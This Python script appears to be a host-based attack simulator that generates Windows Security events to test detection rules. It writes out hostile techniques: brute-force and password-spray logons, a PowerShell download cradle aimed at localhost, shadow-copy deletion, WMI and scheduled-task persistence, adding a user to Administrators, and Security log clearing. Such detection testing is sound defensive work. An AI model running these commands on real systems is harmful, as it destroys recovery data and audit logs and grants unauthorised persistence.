#!/usr/bin/env python3
"""
FLARE -- Attack Simulator v5 (HOST)
==========================================
Host-based attack simulation -- runs ON the target (desktop/client) machine.
Generates real Windows Security / System events that trigger FLARE host rules.

Run from an Administrator PowerShell prompt on the CLIENT node.

Attack types:
  brute_force     Rapid failed local logon attempts    -> Event 4625 (T1110.001)
  password_spray  Failed logons across many usernames  -> Event 4625 (T1110.003)
  ps_cradle       PowerShell download cradle pattern   -> Event 4104 (T1059.001)
  ps_encoded      PowerShell base64 encoded execution  -> Event 4104 (T1027)
  scheduled_task  Suspicious scheduled task created    -> Event 4698 (T1053.005)
  shadow_copy     vssadmin shadow-delete invocation    -> Event 4688 (T1490)
  wmi_persist     WMI event subscription creation      -> Event 5861 (T1546.003)
  priv_group      Add test account to Administrators   -> Event 4728 (T1098)
  log_clear       Clear Security event log             -> Event 1102 (T1070.001)
                  [requires --dangerous flag]

Usage:
  # Interactive mode -- no arguments needed, asks via numbered menu:
  python attack_sim_v5_host.py

  # Quick detection test -- all safe attacks, no ground truth written:
  python attack_sim_v5_host.py --all --detect

  # Full run with ground truth (for retraining):
  python attack_sim_v5_host.py --all --duration 60 --quiet 20

  # Specific attacks only:
  python attack_sim_v5_host.py --attacks brute_force password_spray

  # Include destructive attack (erases Security log):
  python attack_sim_v5_host.py --all --dangerous
"""

import argparse
import base64
import ctypes
import csv
import os
import subprocess
import sys
import threading
import time
from ctypes import wintypes
from datetime import datetime
from pathlib import Path

_HERE = Path(__file__).parent


# ─────────────────────────────────────────────────────────────────────────────
# Ground-truth log (same interface as attack_sim_network.py)
# ─────────────────────────────────────────────────────────────────────────────

_GT_LOCK   = threading.Lock()
_GT_FILE   = None
_GT_WRITER = None
_GT_PATH   = None


def _gt_open(path: Path):
    global _GT_FILE, _GT_WRITER, _GT_PATH
    _GT_PATH = path.resolve()
    _GT_FILE = open(_GT_PATH, "w", newline="", encoding="utf-8")
    _GT_WRITER = csv.writer(_GT_FILE)
    _GT_WRITER.writerow(["unix_us", "event", "attack_type", "detail"])
    _GT_FILE.flush()
    print(f"\n  [GT] Ground truth: {_GT_PATH}\n")


def _gt_write(event: str, attack_type: str, detail: str = ""):
    if _GT_WRITER is None:
        return
    now_us = int(time.time() * 1_000_000)
    with _GT_LOCK:
        _GT_WRITER.writerow([now_us, event, attack_type, detail])
        _GT_FILE.flush()
    ts = datetime.now().strftime("%H:%M:%S.%f")[:-3]
    print(f"  [{ts}] GT  {event:<12} {attack_type}  {detail}")


def _gt_close():
    if _GT_FILE:
        _GT_FILE.close()


# ─────────────────────────────────────────────────────────────────────────────
# Logging helpers
# ─────────────────────────────────────────────────────────────────────────────

_LOG_LOCK = threading.Lock()


def _log(msg: str):
    ts = datetime.now().strftime("%H:%M:%S")
    with _LOG_LOCK:
        print(f"  [{ts}] {msg}")


def _header(text: str):
    bar = "=" * 64
    print(f"\n{bar}")
    print(f"  {text}")
    print(bar)


def _subheader(text: str):
    print(f"\n  -- {text} {'─' * max(0, 56 - len(text))}")


# ─────────────────────────────────────────────────────────────────────────────
# Admin / platform helpers
# ─────────────────────────────────────────────────────────────────────────────

def _is_admin() -> bool:
    try:
        return ctypes.windll.shell32.IsUserAnAdmin() != 0
    except Exception:
        return False


def _elevate_if_needed():
    """
    Re-launch this script with administrator rights via a UAC prompt if it is
    not already running elevated. The elevated instance inherits the same
    command-line arguments; this (non-elevated) instance then exits.
    No-op on non-Windows or if already admin.
    """
    if _is_admin():
        return
    try:
        params = " ".join(f'"{a}"' for a in sys.argv[1:])
        rc = ctypes.windll.shell32.ShellExecuteW(
            None, "runas", sys.executable,
            f'"{os.path.abspath(__file__)}" {params}', None, 1,
        )
    except Exception as exc:
        print(f"  [!] Could not request elevation ({exc}). Continuing without admin.")
        return
    if rc <= 32:
        print("  [!] Administrator elevation was declined. "
              "Admin-only attacks (wmi_persist, priv_group, log_clear) will be skipped.")
        sys.exit(1)
    # Elevated instance has been launched in a new window — hand off to it.
    sys.exit(0)


def _run_ps(script: str) -> subprocess.CompletedProcess:
    return subprocess.run(
        ["powershell.exe", "-NonInteractive", "-NoProfile",
         "-ExecutionPolicy", "Bypass", "-Command", script],
        capture_output=True, text=True,
    )


def _run(cmd: list) -> subprocess.CompletedProcess:
    return subprocess.run(cmd, capture_output=True, text=True)


# ─────────────────────────────────────────────────────────────────────────────
# LogonUser helper -- generates real Event 4625 via Win32 API
# ─────────────────────────────────────────────────────────────────────────────

_ADVAPI32 = ctypes.windll.advapi32
_KERNEL32  = ctypes.windll.kernel32

LOGON32_LOGON_NETWORK    = 3
LOGON32_PROVIDER_DEFAULT = 0

# Garbage password -- will never collide with a real account password
_WRONG_PASSWORD = "Wr0ngP@$$w0rd!Fl@re99x#FLARE"


def _attempt_logon(username: str, domain: str = ".") -> None:
    """
    Calls LogonUserW with a garbage password against the local machine.
    Always fails and writes Event 4625 to the Security log.
    """
    token = wintypes.HANDLE()
    ok = _ADVAPI32.LogonUserW(
        username, domain, _WRONG_PASSWORD,
        LOGON32_LOGON_NETWORK, LOGON32_PROVIDER_DEFAULT,
        ctypes.byref(token),
    )
    if ok:
        # Shouldn't happen -- close handle cleanly if it does
        _KERNEL32.CloseHandle(token)


# ─────────────────────────────────────────────────────────────────────────────
# ATTACK MODULES
# ─────────────────────────────────────────────────────────────────────────────

def attack_brute_force(duration: float) -> dict:
    """
    Rapid failed logon attempts against one username on the local machine.
    Triggers check_brute_force (>= 10 failures from same source in 60s).
    Event 4625, MITRE T1110.001.
    """
    TARGET_USER = "Administrator"
    count    = 0
    deadline = time.monotonic() + duration

    _log(f"BruteForce: rapid failed logons as '{TARGET_USER}' for {duration:.0f}s")
    while time.monotonic() < deadline:
        _attempt_logon(TARGET_USER)
        count += 1
        if count % 25 == 0:
            _log(f"BruteForce: {count} attempts")
        time.sleep(0.05)   # ~20 attempts/sec -- well above the 10/60s threshold

    return {"attempts": count, "username": TARGET_USER, "trigger_event": 4625}


def attack_password_spray(duration: float) -> dict:
    """
    Failed logons cycling through many distinct usernames with one password.
    Triggers check_password_spray (>= 5 distinct usernames from same source in 60s).
    Uses nonexistent accounts so no real account is locked out.
    Event 4625, MITRE T1110.003.
    """
    USERNAMES = [
        "j.smith", "m.jones", "a.patel", "r.kumar", "l.chen",
        "t.nguyen", "k.wilson", "d.garcia", "b.martinez", "c.lee",
        "n.taylor", "p.anderson", "s.thomas", "e.jackson", "h.white",
    ]
    count    = 0
    deadline = time.monotonic() + duration

    _log(f"PasswordSpray: cycling {len(USERNAMES)} usernames for {duration:.0f}s")
    idx = 0
    while time.monotonic() < deadline:
        _attempt_logon(USERNAMES[idx % len(USERNAMES)])
        count += 1
        idx   += 1
        if count % len(USERNAMES) == 0:
            _log(f"PasswordSpray: {count} attempts across {len(USERNAMES)} usernames")
        time.sleep(0.1)    # 10 attempts/sec

    return {"attempts": count, "distinct_users": len(USERNAMES), "trigger_event": 4625}


def attack_ps_cradle(duration: float) -> dict:
    """
    Executes PowerShell with a download-cradle pattern (IEX + WebClient).
    Target is localhost:19999 so the download always fails safely -- the
    script block is still logged to Event 4104 before the error.
    Requires PowerShell Script Block Logging (auto-enabled in preflight if admin).
    MITRE T1059.001.
    """
    script = (
        "try { IEX (New-Object Net.WebClient)"
        ".DownloadString('http://127.0.0.1:19999/payload.ps1') } "
        "catch { Write-Host 'download failed (expected in simulation)' }"
    )
    runs     = 0
    deadline = time.monotonic() + duration

    _log(f"PS-Cradle: IEX/WebClient pattern, repeating every 10s for {duration:.0f}s")
    while time.monotonic() < deadline:
        _run_ps(script)
        runs += 1
        _log(f"PS-Cradle: execution {runs} done")
        time.sleep(min(10.0, deadline - time.monotonic()))

    return {"executions": runs, "trigger_event": 4104}


def attack_ps_encoded(duration: float) -> dict:
    """
    Executes PowerShell via -EncodedCommand with FromBase64String in the body.
    Generates Event 4104 (Script Block Logging).
    MITRE T1027.
    """
    # Inner script -- contains the FromBase64String trigger pattern
    inner   = "[System.Convert]::FromBase64String('SGVsbG8gRmxhcmU=') | ForEach-Object { [char]$_ } | Join-String"
    encoded = base64.b64encode(inner.encode("utf-16-le")).decode("ascii")

    runs     = 0
    deadline = time.monotonic() + duration

    _log(f"PS-Encoded: -EncodedCommand with FromBase64String, repeating every 10s")
    while time.monotonic() < deadline:
        subprocess.run(
            ["powershell.exe", "-NonInteractive", "-NoProfile",
             "-EncodedCommand", encoded],
            capture_output=True,
        )
        runs += 1
        _log(f"PS-Encoded: execution {runs} done")
        time.sleep(min(10.0, deadline - time.monotonic()))

    return {"executions": runs, "trigger_event": 4104}


_TASK_NAME = "FlareSimTask"


def attack_scheduled_task(duration: float) -> dict:
    """
    Creates a scheduled task whose action runs PowerShell hidden from %TEMP%.
    Path and command both match the suspicious patterns in rules.py.
    Generates Event 4698. Task is deleted after the duration.
    MITRE T1053.005.
    """
    temp_dir    = os.environ.get("TEMP", r"C:\Windows\Temp")
    temp_script = os.path.join(temp_dir, "flare_sim_payload.ps1")

    try:
        with open(temp_script, "w") as f:
            f.write("# FLARE simulation -- safe to delete\nWrite-Host 'flare-task-ran'\n")
    except OSError:
        temp_script = r"C:\Windows\Temp\flare_sim_payload.ps1"

    result = _run([
        "schtasks", "/create",
        "/tn", _TASK_NAME,
        "/tr", f'powershell.exe -NonInteractive -WindowStyle Hidden -File "{temp_script}"',
        "/sc", "once",
        "/st", "00:00",
        "/f",
    ])
    created = result.returncode == 0
    _log(f"SchedTask: '{_TASK_NAME}' -> {'created OK' if created else 'FAILED: ' + result.stderr.strip()}")

    # Hold so the event stays inside the capture window
    deadline = time.monotonic() + duration
    while time.monotonic() < deadline:
        time.sleep(5)

    # Cleanup
    _run(["schtasks", "/delete", "/tn", _TASK_NAME, "/f"])
    try:
        os.remove(temp_script)
    except OSError:
        pass
    _log(f"SchedTask: '{_TASK_NAME}' deleted (cleanup)")

    return {"task_name": _TASK_NAME, "created": created, "trigger_event": 4698}


def attack_shadow_copy(duration: float) -> dict:
    """
    Invokes vssadmin with shadow-delete arguments.
    Process creation (Event 4688) triggers check_shadow_copy_deletion in rules.py.
    Running without admin causes vssadmin to exit with Access Denied -- no actual
    shadow copies are deleted, but the 4688 event fires regardless.
    MITRE T1490.
    """
    cmd = ["vssadmin", "delete", "shadows", "/for=C:", "/oldest", "/quiet"]
    _log("ShadowCopy: invoking vssadmin delete shadows (may fail without admin -- that is expected)")
    result = _run(cmd)
    _log(f"ShadowCopy: exit={result.returncode}  "
         f"stderr={result.stderr.strip()[:80] or '(none)'}")

    deadline = time.monotonic() + duration
    while time.monotonic() < deadline:
        time.sleep(5)

    return {"command": " ".join(cmd), "exit_code": result.returncode, "trigger_event": 4688}


_WMI_FILTER_NAME   = "FlareSimFilter"
_WMI_CONSUMER_NAME = "FlareSimConsumer"


def attack_wmi_persist(duration: float) -> dict:
    """
    Creates a WMI __EventFilter + CommandLineEventConsumer subscription pair.
    Generates Event 5861 (WMI Activity). Subscription is removed after the duration.
    Requires admin. MITRE T1546.003.
    """
    create_ps = r"""
$ns = 'root\subscription'
$filter = ([wmiclass]"\\.\$ns`:__EventFilter").CreateInstance()
$filter.Name          = 'FlareSimFilter'
$filter.QueryLanguage = 'WQL'
$filter.Query         = "SELECT * FROM __InstanceModificationEvent WITHIN 3600 WHERE TargetInstance ISA 'Win32_LocalTime'"
$filter.Put() | Out-Null

$consumer = ([wmiclass]"\\.\$ns`:CommandLineEventConsumer").CreateInstance()
$consumer.Name                = 'FlareSimConsumer'
$consumer.CommandLineTemplate = 'cmd.exe /c echo flare-sim'
$consumer.Put() | Out-Null

$binding = ([wmiclass]"\\.\$ns`:__FilterToConsumerBinding").CreateInstance()
$binding.Filter   = $filter.Path_
$binding.Consumer = $consumer.Path_
$binding.Put() | Out-Null

Write-Host 'WMI subscription created'
"""
    cleanup_ps = r"""
Get-WMIObject -Namespace 'root\subscription' -Class __EventFilter |
    Where-Object { $_.Name -eq 'FlareSimFilter' } | Remove-WmiObject
Get-WMIObject -Namespace 'root\subscription' -Class CommandLineEventConsumer |
    Where-Object { $_.Name -eq 'FlareSimConsumer' } | Remove-WmiObject
Get-WMIObject -Namespace 'root\subscription' -Class __FilterToConsumerBinding |
    Where-Object { $_.Filter -like '*FlareSimFilter*' } | Remove-WmiObject
Write-Host 'WMI subscription removed'
"""
    result  = _run_ps(create_ps)
    created = "created" in result.stdout.lower()
    _log(f"WMIPersist: {'subscription created OK' if created else 'FAILED: ' + result.stderr.strip()[:80]}")

    deadline = time.monotonic() + duration
    while time.monotonic() < deadline:
        time.sleep(5)

    cleanup = _run_ps(cleanup_ps)
    _log(f"WMIPersist: cleanup {'OK' if cleanup.returncode == 0 else 'failed'}")

    return {"filter": _WMI_FILTER_NAME, "consumer": _WMI_CONSUMER_NAME,
            "created": created, "trigger_event": 5861}


_TEST_USERNAME = "flare_sim_user"
_TEST_PASSWORD = "Fl@reS!m2024#x"


def attack_priv_group(duration: float) -> dict:
    """
    Creates a temporary local user and adds it to the Administrators group.
    Generates Event 4728 (member added to privileged security group).
    Cleans up (removes user and group membership) after the duration.
    Requires admin. MITRE T1098.
    """
    # Create the throwaway user
    _run(["net", "user", _TEST_USERNAME, _TEST_PASSWORD, "/add"])
    _log(f"PrivGroup: created local user '{_TEST_USERNAME}'")

    # Add to Administrators -- this is the event that fires the rule
    result = _run(["net", "localgroup", "Administrators", _TEST_USERNAME, "/add"])
    added  = result.returncode == 0
    _log(f"PrivGroup: added to Administrators -> {'OK' if added else 'FAILED: ' + result.stderr.strip()}")

    deadline = time.monotonic() + duration
    while time.monotonic() < deadline:
        time.sleep(5)

    # Cleanup
    _run(["net", "localgroup", "Administrators", _TEST_USERNAME, "/delete"])
    _run(["net", "user", _TEST_USERNAME, "/delete"])
    _log(f"PrivGroup: '{_TEST_USERNAME}' removed from Administrators and deleted (cleanup)")

    return {"username": _TEST_USERNAME, "group": "Administrators",
            "added": added, "trigger_event": 4728}


def attack_log_clear(duration: float) -> dict:
    """
    Clears the Windows Security event log.
    Generates Event 1102 (audit log cleared). DESTRUCTIVE -- all prior Security
    log entries are lost. Only runs when --dangerous is passed.
    MITRE T1070.001.
    """
    _log("LogClear: clearing Security event log  *** DESTRUCTIVE ***")
    result  = _run(["wevtutil", "cl", "Security"])
    cleared = result.returncode == 0
    _log(f"LogClear: {'SUCCESS -- Security log cleared' if cleared else 'FAILED: ' + result.stderr.strip()}")

    # Brief hold so the 1102 event is captured before the quiet period starts
    time.sleep(min(duration, 10.0))

    return {"cleared": cleared, "trigger_event": 1102}


# ─────────────────────────────────────────────────────────────────────────────
# Attack registry
# ─────────────────────────────────────────────────────────────────────────────

SAFE_ATTACKS      = ["brute_force", "password_spray", "ps_cradle", "ps_encoded",
                     "scheduled_task", "shadow_copy", "wmi_persist", "priv_group"]
DANGEROUS_ATTACKS = ["log_clear"]
ALL_ATTACKS       = SAFE_ATTACKS + DANGEROUS_ATTACKS

ATTACK_FNS = {
    "brute_force"    : attack_brute_force,
    "password_spray" : attack_password_spray,
    "ps_cradle"      : attack_ps_cradle,
    "ps_encoded"     : attack_ps_encoded,
    "scheduled_task" : attack_scheduled_task,
    "shadow_copy"    : attack_shadow_copy,
    "wmi_persist"    : attack_wmi_persist,
    "priv_group"     : attack_priv_group,
    "log_clear"      : attack_log_clear,
}

ATTACK_LABELS = {
    "brute_force"    : "BruteForce",
    "password_spray" : "PasswordSpray",
    "ps_cradle"      : "PS-DownloadCradle",
    "ps_encoded"     : "PS-EncodedCommand",
    "scheduled_task" : "SuspScheduledTask",
    "shadow_copy"    : "ShadowCopyDelete",
    "wmi_persist"    : "WMIPersistence",
    "priv_group"     : "PrivGroupAdd",
    "log_clear"      : "SecurityLogClear",
}

# Attacks that must run as Administrator
_REQUIRES_ADMIN = {"wmi_persist", "priv_group", "log_clear"}

# Attacks that need PowerShell Script Block Logging for the event to fire
_REQUIRES_SBL   = {"ps_cradle", "ps_encoded"}


# ─────────────────────────────────────────────────────────────────────────────
# Pre-flight checks
# ─────────────────────────────────────────────────────────────────────────────

def _check_sbl() -> bool:
    result = _run_ps(
        "try { (Get-ItemProperty "
        "'HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\PowerShell\\ScriptBlockLogging' "
        "-ErrorAction Stop).EnableScriptBlockLogging -eq 1 } catch { $false }"
    )
    return result.stdout.strip().lower() == "true"


def _enable_sbl():
    ps = (
        "$p = 'HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\PowerShell\\ScriptBlockLogging';"
        "if (-not (Test-Path $p)) { New-Item $p -Force | Out-Null };"
        "Set-ItemProperty $p -Name EnableScriptBlockLogging -Value 1 -Type DWord;"
        "Write-Host 'enabled'"
    )
    return "enabled" in _run_ps(ps).stdout.lower()


def preflight(attacks: list) -> tuple[list, list]:
    """Check prerequisites. Returns (runnable, skipped)."""
    _subheader("Pre-flight checks")
    is_admin = _is_admin()
    print(f"    Admin privileges   : {'YES' if is_admin else 'NO (some attacks will be skipped)'}")

    # Try to auto-enable Script Block Logging if admin and any SBL attack is requested
    sbl_ok = _check_sbl()
    if not sbl_ok and is_admin and any(a in _REQUIRES_SBL for a in attacks):
        _log("Enabling PowerShell Script Block Logging...")
        sbl_ok = _enable_sbl()
    print(f"    ScriptBlockLogging : {'enabled' if sbl_ok else 'DISABLED (ps_cradle/ps_encoded will not generate Event 4104)'}")

    runnable, skipped = [], []
    for atk in attacks:
        if atk in _REQUIRES_ADMIN and not is_admin:
            skipped.append((atk, "requires Administrator"))
        elif atk in _REQUIRES_SBL and not sbl_ok:
            skipped.append((atk, "ScriptBlockLogging disabled -- Event 4104 will not fire"))
        else:
            runnable.append(atk)

    return runnable, skipped


# ─────────────────────────────────────────────────────────────────────────────
# Orchestrator
# ─────────────────────────────────────────────────────────────────────────────

def run(attacks: list, duration: float, quiet: float,
        gt_output: "Path | None", detect: bool):

    runnable, skipped = preflight(attacks)

    if not runnable:
        print("\n  [!] No runnable attacks after pre-flight checks. Exiting.")
        return

    if gt_output and not detect:
        _gt_open(gt_output)

    total_time = int((duration + quiet) * len(runnable))

    _header("FLARE Attack Simulator v5 (HOST)")
    print(f"  Mode    : {'detection test (no ground truth)' if detect else 'full run with ground truth'}")
    print(f"  Attacks : {', '.join(runnable)}")
    if skipped:
        print(f"  Skipped : {', '.join(f'{a} ({r})' for a, r in skipped)}")
    print(f"  Duration: {duration}s per phase  |  Quiet: {quiet}s between phases")
    print(f"  Total   : ~{total_time // 60}m {total_time % 60}s")
    print()

    summary = []

    for idx, attack_name in enumerate(runnable, 1):
        label = ATTACK_LABELS[attack_name]
        _header(f"PHASE {idx}/{len(runnable)}  {attack_name.upper()}  [{label}]  {duration}s")

        if not detect:
            _gt_write("PHASE_START", label, f"duration={duration}")

        fn      = ATTACK_FNS[attack_name]
        t0      = time.time()
        stats   = fn(duration)
        elapsed = time.time() - t0

        if not detect:
            _gt_write("PHASE_END", label, " ".join(f"{k}={v}" for k, v in stats.items()))

        stats["elapsed_s"] = f"{elapsed:.1f}"
        summary.append((attack_name, label, stats))
        print(f"\n  Phase complete: {label}")
        for k, v in stats.items():
            print(f"    {k:<30}: {v}")

        if idx < len(runnable):
            print(f"\n  -- Quiet period ({quiet}s) --")
            remaining = int(quiet)
            while remaining > 0:
                step = min(5, remaining)
                time.sleep(step)
                remaining -= step
                if remaining > 0:
                    print(f"     {remaining}s remaining...")

    _header("SIMULATION COMPLETE")
    print(f"  {'Attack':<16}  {'Label':<22}  Key result")
    print(f"  {'-'*16}  {'-'*22}  {'-'*28}")
    for atk, lbl, st in summary:
        kv = next(iter(st.items()))
        print(f"  {atk:<16}  {lbl:<22}  {kv[0]}={kv[1]}")

    if skipped:
        print(f"\n  Skipped attacks:")
        for atk, reason in skipped:
            print(f"    {atk:<16}  {reason}")
        if any(a in _REQUIRES_ADMIN for a, _ in skipped):
            print("\n  Re-run from an Administrator prompt to unlock skipped attacks.")

    _gt_close()


# ─────────────────────────────────────────────────────────────────────────────
# INTERACTIVE MENU (used when the script is run with no arguments)
# ─────────────────────────────────────────────────────────────────────────────

# Numbered presets shown to the user. Each maps to a list of attack names,
# or the special string "ALL" / "ALL_DANGEROUS" / "DETECT".
_MENU_PRESETS = {
    "1": ("Brute Force (Event 4625, T1110.001)",                  ["brute_force"]),
    "2": ("Password Spray (Event 4625, T1110.003)",               ["password_spray"]),
    "3": ("Brute Force + Password Spray",                         ["brute_force", "password_spray"]),
    "4": ("PowerShell Download Cradle (Event 4104, T1059.001)",   ["ps_cradle"]),
    "5": ("PowerShell Encoded Command (Event 4104, T1027)",       ["ps_encoded"]),
    "6": ("Suspicious Scheduled Task (Event 4698, T1053.005)",    ["scheduled_task"]),
    "7": ("Shadow Copy Deletion (Event 4688, T1490)",             ["shadow_copy"]),
    "8": ("WMI Persistence (Event 5861, T1546.003) -- needs admin", ["wmi_persist"]),
    "9": ("Privileged Group Add (Event 4728, T1098) -- needs admin", ["priv_group"]),
    "10": ("Security Log Clear (Event 1102, T1070.001) -- DESTRUCTIVE, needs admin",
           ["log_clear"]),
    "11": ("Detection test: all safe attacks, no ground truth", "DETECT"),
    "12": ("Run all safe attacks (with ground truth)", "ALL"),
    "13": ("Run all attacks INCLUDING destructive log_clear", "ALL_DANGEROUS"),
}


def _ask(prompt: str, default: str | None = None) -> str:
    suffix = f" [{default}]" if default is not None else ""
    while True:
        val = input(f"{prompt}{suffix}: ").strip()
        if val:
            return val
        if default is not None:
            return default
        print("  Please enter a value.")


def _ask_float(prompt: str, default: float) -> float:
    while True:
        val = input(f"{prompt} [{default}]: ").strip()
        if not val:
            return default
        try:
            return float(val)
        except ValueError:
            print("  Please enter a number.")


def _ask_yes_no(prompt: str, default: bool = False) -> bool:
    suffix = "Y/n" if default else "y/N"
    val = input(f"{prompt} ({suffix}): ").strip().lower()
    if not val:
        return default
    return val in ("y", "yes")


def interactive_menu():
    """
    Prompt the user for everything needed to run a simulation, using a
    numbered menu instead of command-line flags. Returns a dict of kwargs
    suitable for run().
    """
    _header("FLARE Attack Simulator v5 (HOST) -- Interactive Mode")

    print("\n  What attack(s) do you want to run?\n")
    for key in sorted(_MENU_PRESETS, key=lambda k: int(k)):
        label, _ = _MENU_PRESETS[key]
        print(f"    {key:>2}) {label}")
    print(f"    {'14':>2}) Custom selection (pick individual attacks)")

    choice = ""
    while choice not in _MENU_PRESETS and choice != "14":
        choice = input(f"\n  Choice [1-14]: ").strip()

    detect = False
    if choice == "14":
        print("\n  Available attacks:")
        for i, atk in enumerate(ALL_ATTACKS, 1):
            extra = "  *** DESTRUCTIVE ***" if atk in DANGEROUS_ATTACKS else ""
            print(f"    {i}) {atk} ({ATTACK_LABELS[atk]}){extra}")
        raw = _ask("\n  Enter numbers separated by spaces or commas")
        idxs = [s for s in raw.replace(",", " ").split() if s]
        attacks = []
        for s in idxs:
            try:
                n = int(s)
                if 1 <= n <= len(ALL_ATTACKS):
                    attacks.append(ALL_ATTACKS[n - 1])
            except ValueError:
                pass
        if not attacks:
            print("  No valid attacks selected -- defaulting to brute_force + password_spray.")
            attacks = ["brute_force", "password_spray"]

        dangerous_picked = [a for a in attacks if a in DANGEROUS_ATTACKS]
        if dangerous_picked and not _ask_yes_no(
                f"  {', '.join(dangerous_picked)} is DESTRUCTIVE -- proceed?", default=False):
            attacks = [a for a in attacks if a not in DANGEROUS_ATTACKS]
            print(f"  Removed: {', '.join(dangerous_picked)}")
    else:
        _, attacks = _MENU_PRESETS[choice]
        if attacks == "DETECT":
            attacks = SAFE_ATTACKS
            detect  = True
        elif attacks == "ALL":
            attacks = SAFE_ATTACKS
        elif attacks == "ALL_DANGEROUS":
            if _ask_yes_no("  This includes log_clear, which ERASES the Security event "
                           "log -- proceed?", default=False):
                attacks = SAFE_ATTACKS + DANGEROUS_ATTACKS
            else:
                attacks = SAFE_ATTACKS
                print("  Dropped log_clear -- running safe attacks only.")

    duration = _ask_float("\n  Duration per attack phase in seconds", 60.0)
    quiet    = _ask_float("  Quiet gap between phases in seconds", 20.0)

    if not detect:
        detect = _ask_yes_no("  Detection-test mode (skip ground-truth log)", default=False)

    gt_path = None
    if not detect:
        gt_default = str(_HERE / "attack_ground_truth_host.csv")
        gt_path = Path(_ask("  Ground-truth CSV output path", gt_default))

    return {
        "attacks":   attacks,
        "duration":  duration,
        "quiet":     quiet,
        "gt_output": gt_path,
        "detect":    detect,
    }


# ─────────────────────────────────────────────────────────────────────────────
# CLI
# ─────────────────────────────────────────────────────────────────────────────

def main():
    # Run with administrator privileges — relaunch elevated via UAC if needed
    # so admin-only attacks are not skipped.
    _elevate_if_needed()

    # ── No arguments at all -> interactive numbered-menu mode ────────────────
    if len(sys.argv) == 1:
        kwargs = interactive_menu()
        run(**kwargs)
        return

    parser = argparse.ArgumentParser(
        description="FLARE Attack Simulator v5 (HOST) -- run this ON the target desktop",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  # Quick detection test (all safe attacks, no ground truth):
  python attack_sim_v5_host.py --all --detect

  # Full run for retraining ground truth:
  python attack_sim_v5_host.py --all --duration 60 --quiet 20

  # Brute force + spray only:
  python attack_sim_v5_host.py --attacks brute_force password_spray --detect

  # Include log_clear (DESTRUCTIVE -- erases Security log):
  python attack_sim_v5_host.py --all --dangerous
        """
    )
    parser.add_argument("--attacks",   nargs="+", default=[], choices=ALL_ATTACKS,
                        metavar="ATTACK",
                        help=f"Specific attacks to run: {' '.join(ALL_ATTACKS)}")
    parser.add_argument("--all",       action="store_true",
                        help="Run all safe attacks")
    parser.add_argument("--dangerous", action="store_true",
                        help="Also include destructive attacks (log_clear)")
    parser.add_argument("--detect",    action="store_true",
                        help="Detection test mode -- no ground truth written")
    parser.add_argument("--duration",  type=float, default=60.0,
                        help="Seconds per attack phase (default: 60)")
    parser.add_argument("--quiet",     type=float, default=20.0,
                        help="Quiet gap between phases in seconds (default: 20)")
    parser.add_argument("--gt-output", default=None, metavar="PATH",
                        help="Ground truth CSV output path")
    args = parser.parse_args()

    if args.all:
        attacks = SAFE_ATTACKS + (DANGEROUS_ATTACKS if args.dangerous else [])
    elif args.attacks:
        attacks = args.attacks
        if not args.dangerous:
            blocked = [a for a in attacks if a in DANGEROUS_ATTACKS]
            if blocked:
                print(f"  [!] {', '.join(blocked)} require the --dangerous flag. Add it to proceed.")
                sys.exit(1)
    else:
        attacks = ["brute_force", "password_spray"]
        print(f"  No --attacks specified. Defaulting to: {', '.join(attacks)}")
        print(f"  Use --all to run all safe attacks.\n")

    if args.detect:
        gt_path = None
    elif args.gt_output:
        gt_path = Path(args.gt_output)
    else:
        gt_path = _HERE / "attack_ground_truth_host.csv"

    run(
        attacks   = attacks,
        duration  = args.duration,
        quiet     = args.quiet,
        gt_output = gt_path,
        detect    = args.detect,
    )


if __name__ == "__main__":
    main()
